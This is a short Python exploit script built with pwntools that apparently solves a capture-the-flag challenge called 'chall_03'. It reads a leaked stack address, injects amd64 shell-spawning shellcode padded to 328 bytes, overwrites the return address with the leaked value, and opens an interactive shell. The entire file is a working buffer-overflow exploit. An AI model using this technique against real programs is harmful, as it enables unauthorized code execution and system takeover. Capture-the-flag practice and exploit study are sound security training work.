# coding: utf-8
from pwn import *
p = process("./chall_03")
p.recvuntil(b"leak :) ")
leak = p.recvline()
int(leak, 16)
context.arch = "amd64"
shellcode = asm(shellcraft.sh())
payload = shellcode + (328 - len(shellcode))*b"A" + p64(int(leak, 16))
p.sendline(payload)
p.interactive()
